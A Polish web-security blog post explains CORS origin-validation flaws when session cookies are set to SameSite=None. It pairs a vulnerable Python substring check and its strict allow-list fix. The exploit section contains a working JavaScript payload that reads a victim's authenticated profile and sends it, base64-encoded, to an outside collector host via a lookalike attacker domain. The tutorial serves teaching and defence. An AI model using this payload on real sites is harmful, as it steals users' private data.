---
slug: cors-cross-origin-resource-sharing-2026
title: "CORS (Cross-Origin Resource Sharing) w 2026 roku – wyłomy i tarcza SameSite"
authors: [przemyslvw]
tags: ['web-security', 'cors', 'samesite', 'owasp', 'vulnerabilities']
date: "2026-02-13"
---

CORS to mechanizm oparty na nagłówkach HTTP, który pozwala serwerowi zadeklarować, czy skrypt z innej domeny może legalnie odczytać jego odpowiedź, obchodząc restrykcje SOP (Same-Origin Policy). W 2026 roku sam błędny nagłówek CORS nie wystarczy do przejęcia sesji, ponieważ nowoczesne przeglądarki domyślnie ucinają ciasteczka w żądaniach cross-site za sprawą mechanizmu SameSite=Lax. Jakie są więc realne zagrożenia i jak się przed nimi bronić?

<!-- truncate -->

Skuteczny atak kradzieży danych uwierzytelnionych wymaga specyficznego warunku: kombinacji podatnej walidacji nagłówka Origin po stronie backendu oraz faktu, że aplikacja (np. ze względu na architekturę SSO) jawnie przypisała swoim ciasteczkom atrybut `SameSite=None; Secure`.

**Scenariusz z życia (Vulnerable Code)**

Deweloper buduje API w Pythonie i próbuje obsłużyć wiele subdomen za pomocą elastycznego (i niebezpiecznego) sprawdzania ciągu znaków, podczas gdy aplikacja wykorzystuje globalne ciasteczka sesyjne omijające restrykcje przeglądarki.

```python
# API Endpoint - Podatna walidacja Originu (ciastka mają SameSite=None)
origin = request.headers.get('Origin', '')
# Podatność: operator "in" ufa każdej domenie zawierającej "target.com"
if "target.com" in origin:
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return jsonify(sensitive_user_data)
```

**Exploit (Jak to hakujemy)**

1. Analizując ruch, weryfikuję, że ciasteczko sesyjne ofiary posiada flagę `SameSite=None; Secure` (co daje mi zielone światło od przeglądarki na ataki cross-site).  
2. Rejestruję złośliwą domenę omijającą prymitywny filtr backendu, np. `https://target.com.attacker.com` (ciąg znaków zawiera "target.com").  
3. Na mojej domenie hostuję payload: `<script>fetch('https://api.target.com/profile', {credentials: 'include'}).then(r => r.text()).then(d => fetch('https://burp-collaborator.net/?d=' + btoa(d)));</script>`.  
4. Wysyłam link zalogowanej ofierze. Przeglądarka widzi `SameSite=None` i dołącza ciastko do żądania, podatny backend akceptuje mój Origin, a wrażliwy JSON z odpowiedzi trafia prosto do logów w Burp Suite.

**Secure Code (Jak to naprawić)**

Jeśli musimy używać `SameSite=None`, ciężar obrony całkowicie spada na backend. Należy zrezygnować z wyrażeń regularnych czy metod typu contains na rzecz ścisłej, rygorystycznej białej listy (Whitelist).

```python
# API Endpoint - Bezpieczna walidacja (Strict Whitelist)
ALLOWED_ORIGINS = {"https://app.target.com", "https://dev.target.com"}
origin = request.headers.get('Origin', '')
# Zabezpieczenie: Sprawdzamy absolutne dopasowanie 1:1 w zaufanym zbiorze
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return jsonify(sensitive_user_data)
```

---